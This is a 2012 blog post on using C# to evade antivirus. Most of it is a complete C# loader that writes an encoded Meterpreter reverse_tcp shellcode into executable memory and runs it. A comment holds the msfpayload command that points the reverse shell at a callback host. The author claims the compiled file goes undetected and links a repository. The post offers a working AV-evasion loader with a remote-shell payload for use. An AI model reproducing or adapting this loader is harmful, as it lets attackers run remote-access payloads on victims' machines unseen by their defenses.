---
title: "Using .net to bypass AV"
date: "2012-02-23T18:19:00-05:00"
comments: true
highlight: "true"
aliases:
 - "2012/02/23/using-net-to-bypass-av/"
categories:
 - antivirus
 - windows
 - shellcode
 - hacking
 - csharp
 - dotnet
aliases:
 - "/2012/02/using-net-to-bypass-av.html"
---

I've read a ton of articles on bypassing Antivirus software when trying to run shellcode on machines.  There's just a ton available.  These are just a few examples: 

* http://dev.metasploit.com/redmine/projects/framework/wiki/Using_a_Custom_Executable_to_Bypass_AV
* http://www.offensive-security.com/metasploit-unleashed/Antivirus_Bypass
* http://www.irongeek.com/i.php?page=videos/bypassing-anti-virus-with-metasploit
* http://clshack.com/metasploit-shellcodeexec-bypassing-any-anti-virus.html
* http://carnal0wnage.attackresearch.com/2011/07/process-injection-outside-of-metasploit.html

I was recently working with some Windows web-servers, which had ASP.net enabled, but not any other useful language.  I had recently read about [PowerSyringe](http://www.exploit-monday.com/2011/11/powersyringe-powershell-based-codedll.html), so I started tinkering with making some shellcode run similarly. 

<!-- more -->

I ended up finding out that I couldn't do what I was wanting to do in ASP.net as of yet.  If someone else can find a way, please let me know.  Unfortunately, I get the error, "Attempted to read or write protected memory. This is often an indication that other memory is corrupt.", when trying to use this in ASP.net. 

However, for just normal Windows applications, this is yet another great way to hide from AV.  It's very similar to the python method, where you wrap the payload in python, and then turn it into an executable.  Take a look, and let me know of any improvements: 

```
using System;
using System.Runtime.InteropServices;

namespace Wrapper
{
    class Program
    {
        [Flags]
        public enum AllocationType : uint
        {
            COMMIT = 0x1000,
            RESERVE = 0x2000,
            RESET = 0x80000,
            LARGE_PAGES = 0x20000000,
            PHYSICAL = 0x400000,
            TOP_DOWN = 0x100000,
            WRITE_WATCH = 0x200000
        }

        [Flags]
        public enum MemoryProtection : uint
        {
            EXECUTE = 0x10,
            EXECUTE_READ = 0x20,
            EXECUTE_READWRITE = 0x40,
            EXECUTE_WRITECOPY = 0x80,
            NOACCESS = 0x01,
            READONLY = 0x02,
            READWRITE = 0x04,
            WRITECOPY = 0x08,
            GUARD_Modifierflag = 0x100,
            NOCACHE_Modifierflag = 0x200,
            WRITECOMBINE_Modifierflag = 0x400
        }

        public enum FreeType : uint
        {
            MEM_DECOMMIT = 0x4000,
            MEM_RELEASE = 0x8000
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32")]
        private static extern bool VirtualFree(IntPtr lpAddress, UInt32 dwSize, FreeType dwFreeType);

        [UnmanagedFunctionPointerAttribute(CallingConvention.Cdecl)]
        public delegate Int32 ExecuteDelegate();

        static void Main()
        {
            // msfpayload windows/meterpreter/reverse_tcp EXITFUNC=thread LPORT=4444 LHOST=192.168.1.105 R| msfencode -a x86 -e x86/alpha_mixed -t raw BufferRegister=EAX
            string shellcode = "PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIilkXK9ePePc0qpK9HeUazrU4NkrrtplKPRfllK3bdTlKsBExvoOG3zfFP1YovQyPLl5lpaCL7rDl5pzaZofmUQo7KRzPrrrwLKv2vpnkrbUleQJplKspt8K5IPt4rjs1XPf0nkpH5HLKf8gPvaxSHc5l0IlKTtlKGqzv6QyoFQIPLlzajoTMgqxGuh9pRUzTwsQmzXEkametd5kRQHNkchetGqxSRFlK4LbklK2x7lva9ClKS4lKgqXPNiG4VD6DskCkE169sjV1IoM0bxcobznkDRhkK6smbH03drEPC0qx0wRSEbsobtbH2ld7a6UW9oIEMhlPuQePePuyo4RtbpaxTik0BKc09oHUBp2pf060CpBpSpBpphxjtOkoM0YoKenwQzWurHKpMxfau9sXgr30vqClmYZF3ZTPBvqGCXj9lept3QKOZuouo0Pt6lYobns8SEHlbHxpX5Y21FKON53ZC0SZVdbvCgu8s2n9jhsoKOn5Nk6VSZCpE8S0b0C05PPVcZ30e82xLd1CiukOjuNsScCZUP1F0SV7U84BJyhH1OyoN5wqIStiHFMU9fD5hlYSAA";

            byte[] sc = new byte[shellcode.Length];

            for (int i = 0; i < shellcode.Length; i++)
            {
                sc[i] = Convert.ToByte(shellcode[i]);
            }

            // Allocate RWX memory for the shellcode
            IntPtr baseAddr = VirtualAlloc(IntPtr.Zero, (UIntPtr)(sc.Length + 1), AllocationType.RESERVE | AllocationType.COMMIT, MemoryProtection.EXECUTE_READWRITE);
            System.Diagnostics.Debug.Assert(baseAddr != IntPtr.Zero, "Error: Couldn't allocate remote memory");

            try
            {
                // Copy shellcode to RWX buffer
                Marshal.Copy(sc, 0, baseAddr, sc.Length);

                // Get pointer to function created in memory
                ExecuteDelegate del = (ExecuteDelegate)Marshal.GetDelegateForFunctionPointer(baseAddr, typeof(ExecuteDelegate));

                del();
            }
            finally
            {
                VirtualFree(baseAddr, 0, FreeType.MEM_RELEASE);
            }

            Console.ReadLine();
        }
    }
}
```

Once this is compiled, it seems to currently be completely undetectable. 
{{% figure class="img-responsive" src="/img/virustotal_wrapper.png" %}}

<b>Update:</b>Due to several questions, I have uploaded this to [GitHub](https://github.com/mandreko/DotNetAVBypass)
